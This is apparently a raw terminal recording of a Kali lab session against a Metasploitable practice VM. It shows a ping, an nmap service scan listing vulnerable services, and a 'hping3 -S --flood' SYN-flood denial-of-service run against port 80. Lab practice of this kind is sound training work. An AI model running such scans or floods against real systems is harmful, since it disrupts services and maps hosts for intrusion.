@@ -1,0 +1,98 @@
+Script started on 2026-10-05 13:47:49-04:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="155" LINES="43"]
+                                                                                                                                                           
+
+]0;kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hi[4mi[24m[4mi[24m[38;5;244mp a[39m[4mi[39m[4mp[24m[24m[36mi[24m[36mp[39m[36mi[36mp[36m [39m[36mi[36mp[39m[39m [39mad[38;5;244mdr[39m[39md[39mr[?1l>[?2004l
+
+1: [1;36mlo: [0m<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback [1;33m00:00:00:00:00:00[0m brd [1;33m00:00:00:00:00:00[0m
+    inet [1;35m127.0.0.1[0m/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 [1;94m::1[0m/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: [1;36meth0: [0m<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state [1;32mUP [0mgroup default qlen 1000
+    link/ether [1;33m76:38:f2:3a:01:dc[0m brd [1;33mff:ff:ff:ff:ff:ff[0m
+    inet [1;35m192.168.1.21[0m/24 brd [1;35m192.168.1.255 [0mscope global dynamic noprefixroute eth0
+       valid_lft 83960sec preferred_lft 83960sec
+    inet6 [1;94mfe80::7438:f2ff:fe3a:1dc[0m/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+                                                                                                                                                           
+
+]0;kali@kali: ~
+
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hp[1mp[0m[1mp[0m[38;5;244ming -c 4 192.168.1.19[39m[21D[1mp[39m[1mi[0m[0m[4mp[0m[4mi[24m[4mp[4mi[39m[4mn[24m[4mn[39m[4mg[24m[24m[36mp[24m[36mi[24m[36mn[24m[36mg[39m[39m [39m-[39mc[39m [39m4[39m [39m1[39m9[39m2[39m.[39m1[39m6[39m8[39m.[39m1[39m.[39m1[39m9[17D[32m-[32mc[39m[15C[?1l>[?2004l
+
+PING 192.168.1.19 (192.168.1.19) 56(84) bytes of data.
+64 bytes from 192.168.1.19: icmp_seq=1 ttl=64 time=8.59 ms
+64 bytes from 192.168.1.19: icmp_seq=2 ttl=64 time=2.42 ms
+64 bytes from 192.168.1.19: icmp_seq=3 ttl=64 time=2.41 ms
+64 bytes from 192.168.1.19: icmp_seq=4 ttl=64 time=2.29 ms
+
+--- 192.168.1.19 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3018ms
+rtt min/avg/max/mdev = 2.285/3.925/8.586/2.691 ms
+                                                                                                                                                           
+
+]0;kali@kali: ~
+
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hn[4mn[24m[4mn[24m[38;5;244mmap -sV 192.168.1.19[39m[20D[4mn[39m[4mm[24m[24m[36mn[24m[36mm[39m[36mn[36mm[36ma[39m[39m[4mn[39m[4mm[39m[4ma[24m[4ma[39m[4mp[24m[24m[36mn[24m[36mm[24m[36ma[24m[36mp[39m[39m [39m-[39ms[39mV[39m [39m1[39m9[39m2[39m.[39m1[39m6[39m8[39m.[39m1[39m.[39m1[39m9[16D[32m-[32ms[32mV[39m[13C[?1l>[?2004l
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 13:48 -0400
+Nmap scan report for LAPTOP-C1PJK8LR.station (192.168.1.19)
+Host is up (0.00059s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec?
+513/tcp  open  login
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: A2:2D:9C:ED:08:ED (Unknown)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 65.60 seconds
+                                                                                                                                                           
+
+]0;kali@kali: ~
+
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hs[4ms[24m[4ms[24m[38;5;244mudo hping3 -S --flood -p 80 192.168.1.19[39m[40D[4ms[39m[4mu[24m[24m[36ms[24m[36mu[39m[36ms[36mu[36md[39m[39m[4ms[39m[4mu[39m[4md[24m[4md[39m[4mo[24m[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m[39m [39mh[39mp[39mi[39mn[39mg[39m3[39m [39m-[39mS[39m [39m-[39m-[39mf[39ml[39mo[39mo[39md[39m [39m-[39mp[39m [39m8[39m0[39m [39m1[39m9[39m2[39m.[39m1[39m6[39m8[39m.[39m1[39m.[39m1[39m9[36D[36mh[36mp[36mi[36mn[36mg[36m3[39m [32m-[32mS[39m [32m-[32m-[32mf[32ml[32mo[32mo[32md[39m [32m-[32mp[39m[16C[?1l>[?2004l
+
+[sudo] password for kali: 
+HPING 192.168.1.19 (eth0 192.168.1.19): S set, 40 headers + 0 data bytes
+hping in flood mode, no replies will be shown
+^C
+--- 192.168.1.19 hping statistic ---
+238830097 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+                                                                                                                                                           
+
+]0;kali@kali: ~
+
+[0m[27m[24m[J[32m┌──([1m[32m[34mkali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004he[4me[24m[4me[24m[38;5;244mxit[39m[4me[24m[39mx[39mi[39mt[24m[36me[36mx[36mi[36mt[39m[?1l>[?2004l
+
+
+Script done on 2026-10-05 14:02:28-04:00 [COMMAND_EXIT_CODE="1"]
